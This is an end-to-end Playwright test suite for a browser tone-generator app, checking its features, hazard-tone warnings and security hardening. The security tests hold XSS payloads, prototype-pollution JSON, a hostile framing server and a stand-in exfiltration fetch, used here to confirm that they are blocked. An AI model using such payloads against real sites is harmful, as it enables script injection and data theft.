#!/usr/bin/env node
// shepherd.freq — end-to-end test suite
//   npm i --no-save playwright && npx playwright install chromium   (once)
//   node tests/run.mjs                 (PW_CHROMIUM=/path/to/chrome to use a local browser)
// Serves the repo with production headers (tests/serve.mjs) and drives a real
// Chromium through every feature, every safety gate and a set of attacks.
import { chromium } from 'playwright';
import { spawn } from 'node:child_process';
import http from 'node:http';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const PORT = 3271, EVIL = 3272, U = `http://localhost:${PORT}/`;
const here = path.dirname(new URL(import.meta.url).pathname);
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'shepherd-'));
const results = [];
const check = (group, name, ok, detail = '') => results.push({ group, name, ok: !!ok, detail });

const server = spawn(process.execPath, [path.join(here, 'serve.mjs'), String(PORT)], { stdio: 'ignore' });
const evil = http.createServer((q, r) => { r.writeHead(200, { 'Content-Type': 'text/html' }); r.end(`<iframe src="${U}" width=800 height=600></iframe>`); }).listen(EVIL);
await new Promise(r => setTimeout(r, 600));

const browser = await chromium.launch(process.env.PW_CHROMIUM ? { executablePath: process.env.PW_CHROMIUM } : {});
const VIOL = `addEventListener('securitypolicyviolation',e=>{(window.__v=window.__v||[]).push(e.violatedDirective)})`;
async function page({ ack = true, vp = { width: 1440, height: 900 }, mobile = false, init } = {}) {
  const ctx = await browser.newContext({ viewport: vp, isMobile: mobile, hasTouch: mobile, acceptDownloads: true });
  await ctx.addInitScript(VIOL);
  if (ack) await ctx.addInitScript(() => { try { localStorage.setItem('shepherd.freq.ack', '1'); } catch (_) {} });
  if (init) await ctx.addInitScript(init);
  const p = await ctx.newPage();
  p.errors = []; p.dialogs = [];
  p.on('pageerror', e => p.errors.push(e.message));
  p.on('dialog', d => { p.dialogs.push(d.message()); d.dismiss(); });
  return { ctx, p };
}
const ev = (p, f, a) => p.evaluate(f, a);
const wait = ms => new Promise(r => setTimeout(r, ms));
const addLib = async (p, text) => { await p.fill('#srch', ''); await p.click(`.frow:has-text("${text}")`); };

try {
  // ── 1 · LOAD ──────────────────────────────────────────────
  {
    const { ctx, p } = await page();
    await p.goto(U); await wait(3200);
    const st = await ev(p, () => ({
      font: document.fonts.check('300 20px Inter'), img: document.querySelector('.vista').naturalWidth,
      lit: document.body.classList.contains('lit'), rows: document.querySelectorAll('.frow').length,
      v: window.__v || [], tt: !!window.trustedTypes?.defaultPolicy, coi: self.crossOriginIsolated,
    }));
    check('load', 'font, image and reveal', st.font && st.img === 736 && st.lit);
    check('load', 'library renders all entries (114 + 12 spectrum)', st.rows === 126, st.rows);
    check('load', 'no CSP violations', st.v.length === 0, st.v.join());
    check('load', 'Trusted Types policy + cross-origin isolation', st.tt && st.coi);
    check('load', 'service worker active', await ev(p, async () => !!(await navigator.serviceWorker.ready).active));
    await ctx.setOffline(true); await p.reload(); await wait(1500);
    check('load', 'reloads fully offline', await ev(p, () => document.querySelector('.vista').naturalWidth === 736 && document.querySelectorAll('.frow').length > 100));
    check('load', 'no page errors', p.errors.length === 0, p.errors.join(' | '));
    await ctx.close();
  }

  // ── 2 · LIBRARY, SEARCH, FILTERS, SKULLS ─────────────────
  {
    const { ctx, p } = await page();
    await p.goto(U); await wait(1500);
    await p.fill('#srch', '432'); await wait(100);
    check('library', 'search narrows results', (await p.$$('.frow')).length >= 1 && (await p.$$('.frow')).length < 10);
    await p.fill('#srch', 'zzzz'); await wait(100);
    check('library', 'empty search shows message', await p.isVisible('.flib-empty'));
    await p.fill('#srch', '');
    const counts = await ev(p, () => Object.fromEntries([...document.querySelectorAll('.evc[data-k]')].filter(b => b.dataset.k !== 'clear').map(b => [b.dataset.k, +b.querySelector('b').textContent])));
    for (const k of ['claim', 'mix', 'doc', 'em', 'haz', 'ref', 'concept', 'danger']) {
      await p.click(`.evc[data-k=${k}]`); await wait(60);
      const n = (await p.$$('.frow')).length;
      check('library', `colour filter "${k}" shows exactly its ${counts[k]} entries`, n === counts[k] && n > 0, `${n} vs ${counts[k]}`);
      await p.click(`.evc[data-k=${k}]`);
    }
    await p.click('.evc[data-k=claim]'); await p.click('.evc[data-k=danger]'); await wait(60);
    check('library', 'filters combine', (await p.$$('.frow')).length >= counts.claim + 1);
    await p.click('.evc.clr'); await wait(60);
    check('library', 'clear resets filters', (await p.$$('.frow')).length === 126);
    await p.click('.evc[data-k=danger]');
    check('library', 'every "extreme" row carries a skull', await ev(p, () => [...document.querySelectorAll('.frow')].every(r => r.querySelector('.skull'))));
    await p.click('.evc.clr');
    check('library', 'skull filter = 14 (12 hazard tones + 2 mute charges)', counts.danger === 14, counts.danger);
    await p.focus('.frow >> nth=3'); await p.keyboard.press('Enter'); await wait(150);
    check('library', 'keyboard Enter adds a tone', await ev(p, () => tones.length === 1));
    await addLib(p, 'Verdi A (432 Hz)'); await wait(100);
    check('library', 'click adds a tone + row marked used', await ev(p, () => tones.length === 2 && !!document.querySelector('.frow.used')));
    await p.fill('#chz', '99999'); await p.click('#caddbtn');
    check('library', 'custom Hz above 22 kHz rejected', await ev(p, () => tones.length === 2));
    await p.fill('#chz', '123.45'); await p.fill('#cname', 'mine'); await p.press('#cname', 'Enter'); await wait(100);
    check('library', 'custom Hz + label added', await ev(p, () => tones.at(-1).hz === 123.45 && tones.at(-1).name === 'mine'));
    await ctx.close();
  }

  // ── 3 · TONES & AUDIO ENGINE ─────────────────────────────
  {
    const { ctx, p } = await page();
    await p.goto(U); await wait(1200);
    await addLib(p, 'Verdi A (432 Hz)'); await addLib(p, 'solfeggio 528 Hz');
    await p.click('.tc >> nth=0 >> [data-a=toggle]'); await wait(300);
    check('tones', 'card play starts one oscillator', await ev(p, () => ENG.nodes.size === 1 && tones[0].playing && ENG.ctx.state === 'running'));
    await p.click('.tc >> nth=0 >> .sbtn[data-ch=left]'); await wait(100);
    check('tones', 'channel → pan −1', await ev(p, () => tones[0].channel === 'left' && [...ENG.nodes.values()][0].pan.pan.value <= -0.99 + 1e-6 || [...ENG.nodes.values()][0].pan.pan.value < 0));
    await p.selectOption('.tc >> nth=0 >> select[data-a=wave]', 'square');
    check('tones', 'waveform applied', await ev(p, () => [...ENG.nodes.values()][0].osc.type === 'square'));
    await p.$eval('.tc >> nth=0 >> input[data-a=vol]', el => { el.value = '0.3'; el.dispatchEvent(new Event('input', { bubbles: true })); });
    check('tones', 'volume applied', await ev(p, () => tones[0].volume === 0.3));
    await p.selectOption('.tc >> nth=0 >> select[data-a=pulse]', '10'); await wait(200);
    check('tones', 'pulse adds an LFO gate', await ev(p, () => !!ENG.nodes.get(tones[0].id)?.lfo && ENG.nodes.get(tones[0].id).lfo.frequency.value === 10));
    await p.click('#gbtn'); await wait(300);   // something is sounding → global button stops everything
    check('tones', 'global button stops when anything sounds', await ev(p, () => ENG.nodes.size === 0 && !tones.some(t => t.playing)));
    await p.click('#gbtn'); await wait(300);
    check('tones', 'global button plays every tone', await ev(p, () => tones.every(t => t.playing) && ENG.nodes.size === 2));
    await p.$eval('#mvol', el => { el.value = '0.4'; el.dispatchEvent(new Event('input', { bubbles: true })); });
    check('tones', 'master volume', await ev(p, () => ENG.vol === 0.4));
    await p.click('#stopallbtn'); await wait(200);
    check('tones', 'stop all', await ev(p, () => ENG.nodes.size === 0 && !tones.some(t => t.playing)));
    check('tones', 'hero shows the latest tone', (await p.textContent('#heroHz')).length > 0);
    await p.reload(); await wait(1200);
    check('tones', 'non-sweep tones stay non-sweep after reload (no 0 → 0.01 Hz clamp)', await ev(p, () => tones.every(t => t.sweepTo === 0)) && !(await p.textContent('#tgrid')).includes('0.01'));
    check('tones', 'tones persist across reload (with settings)', await ev(p, () => tones.length === 2 && tones[0].channel === 'left' && tones[0].waveform === 'square' && tones[0].pulse === 10));
    await p.click('.tc >> nth=0 >> [data-a=remove]'); await wait(100);
    check('tones', 'remove tone', await ev(p, () => tones.length === 1));
    await ev(p, () => { for (let i = 0; i < 60; i++) newTone({ hz: 100 + i, name: 'x', cat: 'reference' }); });
    check('tones', '48-tone cap', await ev(p, () => tones.length === 48));
    check('tones', 'no page errors', p.errors.length === 0, p.errors.join(' | '));
    await ctx.close();
  }

  // ── 4 · INTERVALS ────────────────────────────────────────
  {
    const { ctx, p } = await page();
    await p.goto(U); await wait(1200);
    await p.click('.ctab[data-sub=int]');
    const prev = () => ev(p, () => [...document.querySelectorAll('#iprev .pv')].map(e => e.textContent.replace(/Hz|[LR]$/g, '').replace(/[^\d.]/g, '')));
    const sets = () => ev(p, () => buildSet().set.map(t => `${t.hz}${t.channel[0]}`).join(' '));
    check('intervals', 'beat 10 Hz binaural → 200 L / 210 R', (await sets()) === '200l 210r', await sets());
    await p.click('#ibtype .sbtn[data-v=monaural]');
    check('intervals', 'monaural → both channels', (await sets()) === '200b 210b');
    await p.click('#ibeatp .chip[data-v="6"]');
    check('intervals', 'theta preset → 206', (await sets()) === '200b 206b');
    await p.click('#imode .sbtn[data-m=harm]');
    check('intervals', 'harmonics ×4 → 200 400 600 800', (await sets()) === '200b 400b 600b 800b');
    await p.click('#imode .sbtn[data-m=ratio]');
    check('intervals', 'fifth ×3 → 200 300 450', (await sets()) === '200b 300b 450b');
    await p.click('#imode .sbtn[data-m=step]');
    check('intervals', 'step +111 ×3 → 200 311 422', (await sets()) === '200b 311b 422b');
    await p.fill('#ibase', '21900'); await wait(50);   // 21900 ok · 22011 and 22122 exceed 22 kHz
    check('intervals', 'out-of-range tones dropped', (await sets()) === '21900b' && (await p.textContent('#iprev')).includes('2 tones outside'), await sets());
    await p.fill('#ibase', '200'); await p.selectOption('#ipulse', '10'); await p.click('#iplay'); await wait(500);
    check('intervals', 'add & play: 3 pulsing tones sounding', await ev(p, () => tones.length === 3 && tones.every(t => t.playing && t.pulse === 10)));
    check('intervals', 'preview rendered', (await prev()).length === 3);
    await ctx.close();
  }

  // ── 5 · INSIGHT ANALYSIS ─────────────────────────────────
  {
    const { ctx, p } = await page();
    await p.goto(U); await wait(1200);
    const a = (x, y, cx = 'both', cy = 'both') => ev(p, ([x, y, cx, cy]) => analyzePair({ hz: x, channel: cx, cat: 'reference' }, { hz: y, channel: cy, cat: 'reference' }).tags.map(t => t[1]).join(' | '), [x, y, cx, cy]);
    check('insight', '200 L + 210 R → binaural 10 Hz alpha', /binaural 10 Hz.*alpha/.test(await a(200, 210, 'left', 'right')), await a(200, 210, 'left', 'right'));
    check('insight', '200 + 206 same ear → beating 6 Hz theta', /beating 6 Hz.*theta/.test(await a(200, 206)));
    check('insight', '400 + 450 → rough', /rough 50 Hz/.test(await a(400, 450)));
    check('insight', '200 + 300 → perfect fifth, consonant', /perfect fifth.*consonant/.test(await a(200, 300)));
    check('insight', '220 + 440 → octave', /octave/.test(await a(220, 440)));
    check('insight', '7.83 + 40 → sub-audio', /sub-audio/.test(await a(7.83, 40)));
    check('insight', 'skull pair tagged extreme caution', await ev(p, () => analyzePair({ hz: 2500, cat: 'lrad', channel: 'both' }, { hz: 440, cat: 'reference', channel: 'both' }).tags[0][1] === 'extreme caution'));
    await addLib(p, 'solfeggio 528 Hz'); await addLib(p, 'mosquito device low'); await addLib(p, 'infrasound 7 Hz');
    await p.click('.ctab[data-sub=ins]'); await wait(200);
    const applies = await ev(p, () => [...document.querySelectorAll('.nt.now h4')].map(h => h.firstChild.textContent));
    for (const t of ['hearing safety', 'extreme caution tones', 'high frequencies · above ~15 kHz', 'infrasound · below 20 Hz', 'glass & resonance', 'healing claims', 'not medical advice'])
      check('insight', `note applies: ${t}`, applies.includes(t), applies.join(', '));
    check('insight', '3 tones → 3 pairs', (await p.$$('.pair')).length === 3);
    await ctx.close();
  }

  // ── 6 · SAFETY GATES ─────────────────────────────────────
  {
    const { ctx, p } = await page({ ack: false });
    await p.goto(U); await wait(1200);
    await addLib(p, 'Verdi A (432 Hz)');
    await p.click('.tc >> nth=0 >> [data-a=toggle]'); await wait(200);
    check('safety', 'first-listen notice before any sound', await p.isVisible('#ack') && await ev(p, () => ENG.nodes.size === 0));
    await p.click('#ackno'); await wait(320);
    check('safety', '"not now" keeps silence', await ev(p, () => ENG.nodes.size === 0) && !(await p.isVisible('#ack')));
    await p.click('.tc >> nth=0 >> [data-a=toggle]'); await p.click('#ackyes'); await wait(300);
    check('safety', '"I understand" plays and is remembered', await ev(p, () => ENG.nodes.size === 1 && localStorage.getItem('shepherd.freq.ack') === '1'));
    await addLib(p, 'LRAD midpoint');
    check('safety', 'skull tone added at 20 % volume', await ev(p, () => tones.at(-1).volume === 0.2));
    await p.click('.tc >> nth=1 >> [data-a=toggle]'); await wait(200);
    check('safety', 'extreme-caution warning, cancel focused', await p.isVisible('#danger') && await ev(p, () => document.activeElement.id === 'dgno'));
    await p.keyboard.press('Escape'); await wait(320);
    check('safety', 'Escape cancels — skull tone silent', await ev(p, () => !tones[1].playing) && !(await p.isVisible('#danger')));
    await p.click('.tc >> nth=1 >> [data-a=toggle]'); await p.click('#dgyes'); await wait(300);
    check('safety', '"play quietly" plays the skull tone', await ev(p, () => tones[1].playing));
    await addLib(p, 'mosquito device low'); await p.click('.tc >> nth=2 >> [data-a=toggle]'); await wait(200);
    check('safety', 'warning asked once per session', await ev(p, () => tones[2].playing) && !(await p.isVisible('#danger')));
    await ctx.close();
  }

  // ── 7 · MUTE CHARGE ──────────────────────────────────────
  {
    const { ctx, p } = await page();
    await p.goto(U); await wait(1200);
    await p.click('.ctab[data-sub=mute]'); await wait(150);
    check('mute', 'three charges shown', (await p.$$('.charge')).length === 3);
    const modes = await ev(p, () => roomModes(4, 3.5, 2.6).map(m => m.f));
    check('mute', 'room modes: 4 m → 171.5 Hz (n=4)', modes.includes(171.5), modes.join(' '));
    check('mute', 'room modes: 3.5 m → 196 Hz, 2.6 m → 197.88 Hz', modes.includes(196) && modes.includes(197.88));
    check('mute', 'default picks in-band mode nearest 175', (await p.textContent('#roomHz')).startsWith('171.5'));
    check('mute', 'in-band modes highlighted', (await p.$$('.mode.band')).length === 3);
    await p.fill('#roomL', '5'); await wait(80);
    check('mute', 'modes follow room size (5 m → 171.5 via n=5)', await ev(p, () => roomModes(5, 3.5, 2.6).some(m => m.f === 171.5)));
    await p.fill('#roomL', '0.2'); await wait(80);
    check('mute', 'invalid room size rejected', (await p.textContent('#modehint')).includes('between'));
    await p.fill('#roomL', '4'); await wait(80);
    await p.click('.mode:has-text("196")'); await wait(50);
    check('mute', 'tap a mode selects it', (await p.textContent('#roomHz')).startsWith('196'));
    await p.click('[data-arm=room]:not([data-play])'); await wait(150);
    check('mute', 'arm room → 196 Hz tone, PEMF/research domain', await ev(p, () => tones.at(-1).hz === 196 && tones.at(-1).cat === 'mutecharge' && /PEMF/.test(tones.at(-1).desc)));
    await p.click('#roomkind .sbtn[data-v=sweep]'); await p.click('[data-arm=room][data-play]'); await wait(1500);
    const f1 = await ev(p, () => ENG.nodes.get(tones.at(-1).id)?.osc.frequency.value);
    await wait(2000);
    const f2 = await ev(p, () => ENG.nodes.get(tones.at(-1).id)?.osc.frequency.value);
    check('mute', 'sweep 150→200 rises over time', f1 > 150 && f2 > f1 && f2 < 200, `${f1} → ${f2}`);
    check('mute', 'sweep card shows 150–200', (await p.textContent('.tc:last-child .tc-hz')).includes('150–200'));
    await p.click('#stopallbtn'); await ev(p, () => { tones.length = 0; renderTones(); });
    await p.click('.ctab[data-sub=mute]');
    await p.click('[data-arm=all][data-play]'); await wait(200);
    check('mute', 'arm all & play asks extreme-caution first', await p.isVisible('#danger') && await ev(p, () => tones.length === 0));
    await p.click('#dgyes'); await wait(400);
    const t = await ev(p, () => tones.map(t => [t.hz, t.volume, isDanger(t), t.playing]));
    check('mute', 'arms 18.98 / room / 2500, all playing', t.length === 3 && t[0][0] === 18.98 && t[2][0] === 2500 && t.every(x => x[3]), JSON.stringify(t));
    check('mute', 'infrasound + saturation charges skull-marked at 20 %', t[0][2] && t[2][2] && t[0][1] === 0.2 && t[2][1] === 0.2 && !t[1][2]);
    await p.click('.ctab[data-sub=ins]'); await wait(150);
    const n = await ev(p, () => [...document.querySelectorAll('.nt.now h4')].map(h => h.firstChild.textContent));
    check('mute', 'insight: "concept, not silence" + room-modes notes', n.includes('mute charge is a concept, not silence') && n.includes('room modes'), n.join(', '));
    check('mute', 'no page errors', p.errors.length === 0, p.errors.join(' | '));
    await ctx.close();
  }

  // ── 8 · SECURITY ─────────────────────────────────────────
  {
    const { ctx, p } = await page();
    await p.goto(U); await wait(1500);
    await p.fill('#chz', '432'); await p.fill('#cname', '<img src=x onerror=alert(1)>'); await p.click('#caddbtn'); await wait(200);
    check('security', 'XSS in label shown as inert text', (await p.$eval('.tc-name', e => e.textContent)) === '<img src=x onerror=alert(1)>' && (await p.$$('#tgrid img')).length === 0);
    const sink = await ev(p, () => { document.body.insertAdjacentHTML('beforeend', '<img id=z src=x onerror="window.__p=1"><script>window.__p=2<\/script><a id=y href="javascript:window.__p=3">a</a>'); return [document.getElementById('z').getAttribute('onerror'), !!document.querySelector('body > script:not([src])') && document.querySelectorAll('script').length > 1, document.getElementById('y').getAttribute('href')]; });
    check('security', 'HTML sinks sanitized (handlers, scripts, js: URLs)', sink[0] === null && sink[1] === false && sink[2] === null, JSON.stringify(sink));
    check('security', 'string eval refused', await ev(p, () => { try { setTimeout('window.__p=4', 0); return false; } catch (e) { return true; } }));
    check('security', 'rogue Trusted Types policy refused', await ev(p, () => { try { trustedTypes.createPolicy('x', { createHTML: s => s }); return false; } catch (e) { return true; } }));
    check('security', 'exfiltration fetch blocked', await ev(p, async () => { try { await fetch('https://example.com/?' + localStorage.length); return false; } catch (e) { return true; } }));
    check('security', 'built-in prototypes frozen', await ev(p, () => Object.isFrozen(Object.prototype) && Object.isFrozen(Array.prototype)));
    await wait(300);
    check('security', 'nothing executed, no dialogs', (await ev(p, () => window.__p ?? null)) === null && p.dialogs.length === 0);
    await p.click('.ctab[data-sub=spk]');
    const [dl] = await Promise.all([p.waitForEvent('download'), p.click('#dlbtn')]);
    const single = path.join(tmp, 'single.html'); await dl.saveAs(single);
    await ctx.close();

    const { ctx: c2, p: p2 } = await page({ init: () => {
      const e = JSON.parse('{"__proto__":{"polluted":1},"vol":"9","tones":[{"__proto__":{"polluted":1},"id":"1","hz":"1e3","name":"<svg onload=alert(2)>","cat":"__proto__","volume":99,"deviceId":{"a":1}}]}');
      for (let i = 0; i < 4000; i++) e.tones.push({ id: i, hz: 440 });
      localStorage.setItem('shepherd.freq.v1', JSON.stringify(e));
    } });
    await p2.goto(U); await wait(1200);
    const ps = await ev(p2, () => ({ pol: ({}).polluted ?? null, n: tones.length, cat: tones[0].cat, vol: ENG.vol, ids: new Set(tones.map(t => t.id)).size === tones.length, svg: document.querySelectorAll('svg[onload]').length }));
    check('security', 'poisoned storage: no pollution, capped, sanitized', ps.pol === null && ps.n === 48 && ps.cat === 'reference' && ps.vol === 1 && ps.ids && ps.svg === 0, JSON.stringify(ps));
    await c2.close();

    const { ctx: c3, p: p3 } = await page({ init: () => { navigator.mediaDevices.enumerateDevices = async () => [{ kind: 'audiooutput', deviceId: 'default', label: 'Default' }, { kind: 'audiooutput', deviceId: 'x"><img src=x onerror=alert(3)>', label: 'JBL <img src=x onerror=alert(4)>‮' + 'A'.repeat(300) }]; } });
    await p3.goto(U); await wait(1200); await p3.click('.ctab[data-sub=spk]');
    check('security', 'hostile bluetooth name inert and capped', await ev(p3, () => document.querySelectorAll('#devlist img').length === 0 && [...document.querySelectorAll('.dev-name')].every(e => e.textContent.length <= 64 && !e.textContent.includes('‮'))) && p3.dialogs.length === 0);
    await c3.close();

    const { ctx: c4, p: p4 } = await page();
    await p4.goto(`http://127.0.0.1:${EVIL}/`); await wait(1500);
    const fr = p4.frames().find(f => f.url().startsWith(U));
    const framedLen = fr ? await fr.evaluate(() => document.body?.innerText.length || 0).catch(() => 0) : 0;
    check('security', 'cannot be framed by another site', framedLen === 0);
    await c4.close();

    const { ctx: c5, p: p5 } = await page();
    await p5.goto(U); await wait(1500);
    await ev(p5, async () => { await fetch('/assets/vista.webp?poison=1'); await fetch('/README.md').catch(() => 0); });
    const keys = await ev(p5, async () => { const k = []; for (const n of await caches.keys()) for (const r of await (await caches.open(n)).keys()) k.push(new URL(r.url).pathname + new URL(r.url).search); return k; });
    check('security', 'service-worker cache holds allow-list only', keys.length === 8 && keys.every(k => !k.includes('?') && !k.includes('README')), keys.join(' '));
    await c5.close();

    const c6 = await browser.newContext(); await c6.addInitScript(VIOL);
    await c6.route('**/*', r => /^(file|data|blob):/.test(r.request().url()) ? r.continue() : r.abort());
    const p6 = await c6.newPage(); await p6.goto('file://' + single); await wait(2200);
    const s6 = await ev(p6, () => ({ font: document.fonts.check('300 20px Inter'), img: document.querySelector('.vista').naturalWidth, v: window.__v || [], rows: document.querySelectorAll('.frow').length }));
    check('security', 'single file: offline, CSP intact, fully styled', s6.font && s6.img === 736 && s6.v.length === 0 && s6.rows === 126, JSON.stringify(s6));
    await c6.close();
  }

  // ── 8b · UNCLICK, RESET, CAUTION COLOURS, COMBOS ──────────
  {
    const { ctx, p } = await page();
    await p.goto(U); await wait(1200);
    await addLib(p, 'Verdi A (432 Hz)'); await addLib(p, 'solfeggio 528 Hz');
    await p.click('.tc >> nth=0 >> [data-a=toggle]'); await wait(200);
    await addLib(p, 'Verdi A (432 Hz)'); await wait(150);
    check('unclick', 'clicking an added frequency again removes it (and stops it)', await ev(p, () => tones.length === 1 && tones[0].hz === 528 && ENG.nodes.size === 0));
    check('unclick', 'row no longer marked used', await ev(p, () => ![...document.querySelectorAll('.frow.used')].some(r => r.textContent.includes('Verdi'))));
    await addLib(p, 'Verdi A (432 Hz)');
    check('unclick', 'clicking again re-adds it', await ev(p, () => tones.length === 2));

    // reset + undo
    await p.click('#gbtn'); await wait(300);
    await p.click('#resetbtn'); await wait(200);
    check('reset', 'reset clears every tone and stops audio', await ev(p, () => tones.length === 0 && ENG.nodes.size === 0) && await p.isVisible('#toast'));
    check('reset', 'reset/save/stop buttons hidden when empty', await ev(p, () => ['resetbtn', 'savebtn', 'stopallbtn'].every(id => document.getElementById(id).hidden)));
    await p.click('#toastact'); await wait(200);
    check('reset', 'undo restores the tones (silent)', await ev(p, () => tones.length === 2 && tones.every(t => !t.playing)));

    // caution colours on beat rate
    await p.click('.ctab[data-sub=int]'); await wait(100);
    const chipRisk = await ev(p, () => [...document.querySelectorAll('#ibeatp .chip')].map(c => c.dataset.v + ':' + [...c.classList].find(k => k.startsWith('rk-'))).join(' '));
    check('caution', 'beat chips colour-coded (delta/theta caution, alpha low, beta mild, gamma high)', chipRisk === '2:rk-care 6:rk-care 10:rk-low 18:rk-mild 40:rk-high', chipRisk);
    check('caution', 'legend shows 4 levels', (await p.$$('.rk-legend span')).length === 4);
    for (const [v, k, word] of [['2', 'care', 'driving'], ['10', 'low', 'gentlest'], ['18', 'mild', 'restless'], ['40', 'high', 'seizure'], ['5.5', 'care', 'driving'], ['25', 'mild', 'restless']]) {
      await p.fill('#ibeat', v); await wait(40);
      const n = await ev(p, () => [document.getElementById('ibeatrisk').className, document.getElementById('ibeatrisk').textContent]);
      check('caution', `beat ${v} Hz → ${k} note`, n[0].includes('rk-' + k) && n[1].includes(word), n.join(' / '));
    }
    await p.selectOption('#ipulse', '40'); await wait(40);
    check('caution', 'pulse rate gets the same caution note', await ev(p, () => !document.getElementById('ipulserisk').hidden && document.getElementById('ipulserisk').className.includes('rk-high')));

    // combos
    await p.click('.ctab[data-sub=combos]'); await wait(100);
    check('combos', 'empty state shown', await p.isVisible('#combolist .ins-empty'));
    await p.fill('#comboName', 'evening <b>set</b>'); await p.press('#comboName', 'Enter'); await wait(150);
    check('combos', 'save current mix with a name', await ev(p, () => combos.length === 1 && combos[0].tones.length === 2 && combos[0].name === 'evening <b>set</b>'));
    check('combos', 'name rendered as text, not markup', (await p.$$('.combo b')).length === 0);
    await p.click('#savebtn'); await wait(150);
    check('combos', '"save" above the tones auto-names', await ev(p, () => combos.length === 2 && /^(432 \+ 528|528 \+ 432) Hz$/.test(combos[0].name)), await ev(p, () => combos.map(c=>c.name+':'+c.tones.map(t=>t.hz)).join(' / ')));
    await p.reload(); await wait(1200); await p.click('.ctab[data-sub=combos]');
    check('combos', 'combos persist across reload', await ev(p, () => combos.length === 2));
    await p.fill('.combo >> nth=1 >> .combo-name', 'renamed'); await p.press('.combo >> nth=1 >> .combo-name', 'Tab'); await wait(100);
    check('combos', 'rename', await ev(p, () => combos[1].name === 'renamed'));
    await ev(p, () => { tones = []; renderTones(); });
    await addLib(p, 'gamma 40 Hz');
    await p.click('.combo >> nth=1 >> button[data-a=add]'); await wait(200);
    check('combos', '"add" appends to the current mix', await ev(p, () => tones.length === 3));
    await p.click('.ctab[data-sub=combos]');
    await p.click('.combo >> nth=1 >> button[data-a=load]'); await wait(200);
    check('combos', '"load" replaces the current mix', await ev(p, () => tones.length === 2 && tones.map(t => t.hz).sort().join() === '432,528'));
    await p.click('.ctab[data-sub=combos]');
    await p.click('.combo >> nth=0 >> button[data-a=play]'); await wait(400);
    check('combos', '"play" loads and plays', await ev(p, () => tones.length === 2 && tones.every(t => t.playing) && ENG.nodes.size === 2));
    await p.click('.ctab[data-sub=combos]');
    await p.click('.combo >> nth=0 >> button[data-a=delete]'); await wait(100);
    check('combos', 'delete', await ev(p, () => combos.length === 1));
    await p.click('#toastact'); await wait(100);
    check('combos', 'undo delete', await ev(p, () => combos.length === 2));
    const [dl] = await Promise.all([p.waitForEvent('download'), p.click('#comboexp')]);
    const exp = path.join(tmp, 'combos.json'); await dl.saveAs(exp);
    const ej = JSON.parse(fs.readFileSync(exp, 'utf8'));
    check('combos', 'export file', ej.app === 'shepherd.freq' && ej.combos.length === 2 && !('deviceId' in ej.combos[0].tones[0]));
    await ev(p, () => { combos.length = 0; saveCombos(); renderCombos(); });
    await p.setInputFiles('#combofile', exp); await wait(300);
    check('combos', 'import round-trip', await ev(p, () => combos.length === 2 && combos.some(c => c.name === 'renamed')));
    await p.setInputFiles('#combofile', exp); await wait(300);
    check('combos', 're-import skips duplicates', await ev(p, () => combos.length === 2));
    const evilFile = path.join(tmp, 'evil.json');
    const evilCombos = [{ name: '<img src=x onerror=alert(9)>', tones: [{ hz: '1e3', name: '<svg onload=alert(8)>', cat: '__proto__', volume: 50, __proto__: { x: 1 } }, { hz: -4 }, { hz: 1e9 }] }];
    for (let i = 0; i < 500; i++) evilCombos.push({ name: 'n' + i, tones: [{ hz: 100 + i }] });
    fs.writeFileSync(evilFile, '{"__proto__":{"polluted":1},"combos":' + JSON.stringify(evilCombos) + '}');
    await p.setInputFiles('#combofile', evilFile); await wait(400);
    const ci = await ev(p, () => ({ n: combos.length, pol: ({}).polluted ?? null, t: combos.find(c => c.name.startsWith('<img'))?.tones, imgs: document.querySelectorAll('#combolist img,#combolist svg[onload]').length }));
    check('combos', 'hostile import: capped at 50, no pollution, inert names, bad tones dropped', ci.n === 50 && ci.pol === null && ci.imgs === 0 && ci.t?.length === 1 && ci.t[0].hz === 1000 && ci.t[0].volume === 1 && ci.t[0].cat === 'reference', JSON.stringify(ci));
    const big = path.join(tmp, 'big.json'); fs.writeFileSync(big, 'x'.repeat(300 * 1024));
    await p.setInputFiles('#combofile', big); await wait(200);
    check('combos', 'oversized import refused', (await p.textContent('#toastmsg')).includes('too large'));
    const bad = path.join(tmp, 'bad.json'); fs.writeFileSync(bad, '{not json');
    await p.setInputFiles('#combofile', bad); await wait(200);
    check('combos', 'malformed import refused', (await p.textContent('#toastmsg')).includes('not a valid'));
    check('combos', 'no page errors / dialogs', p.errors.length === 0 && p.dialogs.length === 0, p.errors.join(' | '));
    await ctx.close();

    const { ctx: c2, p: p2 } = await page({ ack: true });
    await p2.goto(U); await wait(1000);
    await addLib(p2, 'LRAD midpoint'); await p2.click('#savebtn'); await ev(p2, () => { tones = []; renderTones(); });
    await p2.click('.ctab[data-sub=combos]'); await p2.click('.combo >> nth=0 >> button[data-a=play]'); await wait(200);
    check('combos', 'playing a combo with a skull tone asks extreme caution first', await p2.isVisible('#danger') && await ev(p2, () => ENG.nodes.size === 0));
    check('combos', 'skull shown on that combo', (await p2.$$('.combo.sk .ev-haz')).length === 1);
    await c2.close();
  }

  // ── 8c · EASY BLUETOOTH / OUTPUT CONNECTION ───────────────
  {
    const fakeOuts = () => {
      window.__outs = [{ kind: 'audiooutput', deviceId: 'default', label: 'Default - Speakers' }, { kind: 'audiooutput', deviceId: 'spk1', label: 'Built-in Speakers' }];
      navigator.mediaDevices.enumerateDevices = async () => window.__outs.map(d => ({ ...d }));
      navigator.mediaDevices.getUserMedia = async () => ({ getTracks: () => [] });
    };
    const { ctx, p } = await page({ init: fakeOuts });
    await p.goto(U); await wait(1200);
    await p.click('.ctab[data-sub=spk]'); await wait(150);
    check('connect', 'status shows where sound goes', (await p.textContent('#connname')).length > 0 && (await p.textContent('#conncap')).includes('can send tones'));
    await p.click('#connbtn'); await wait(200);
    check('connect', 'guide opens with 3 steps for this platform (linux)', (await p.$$('.step')).length === 3 && (await p.textContent('#g2t')) === 'pair it on your computer' && await p.isHidden('#g2open'));
    check('connect', 'listening indicator shown', await p.isVisible('#listen'));
    await addLib(p, 'Verdi A (432 Hz)'); await p.click('.ctab[data-sub=spk]');
    await ev(p, () => { window.__outs.push({ kind: 'audiooutput', deviceId: 'bt-jbl', label: 'JBL Flip 5 (Bluetooth)' }); navigator.mediaDevices.dispatchEvent(new Event('devicechange')); });
    await wait(400);
    check('connect', 'new bluetooth device detected automatically', (await p.textContent('#toastmsg')).includes('JBL Flip 5') && await ev(p, () => document.getElementById('g3').classList.contains('done')));
    check('connect', 'device listed with BT tag', await ev(p, () => [...document.querySelectorAll('.dev')].some(d => d.textContent.includes('JBL') && d.querySelector('.tag.bt'))));
